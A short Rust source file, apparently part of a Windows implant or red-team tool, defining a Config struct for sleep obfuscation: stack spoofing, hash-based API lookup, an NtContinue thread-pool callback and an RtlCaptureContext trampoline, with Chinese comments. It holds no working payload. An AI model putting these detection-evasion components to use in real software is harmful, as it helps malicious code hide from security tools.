#![allow(unused)]

use core::ptr::null_mut;
use puerto::hash::{fnv1a_utf16,fnv1a_utf16_from_u8};
use crate::{debug_log,stealth_bail};// replace anyhow
use puerto::winapis::{NtCurrentProcess,NT_SUCCESS};
use puerto::module::{get_module_address,get_proc_address,get_ntdll_address};
use crate::types::*;// crate代表本库(crate)的根目录
use crate::spoof::{StackSpoof};



/// Stores resolved DLL base addresses and function pointers
/// 
/// 是执行混淆时用到的各种配件
#[derive(Default,Debug,Clone,Copy)]
pub struct Config{
 pub stack:StackSpoof,
 /// 休眠结束后,让thread pool触发ntcontinue,继续执行hyponus.rs中timer()/wait()中定义好的执行流
 pub callback:u64,

 /// 执行RtlCaptureContext的rx内存地址;在混淆链启动时获取快照
pub trampoline:u64,

 // 以下字段在config::new中初始化
   


}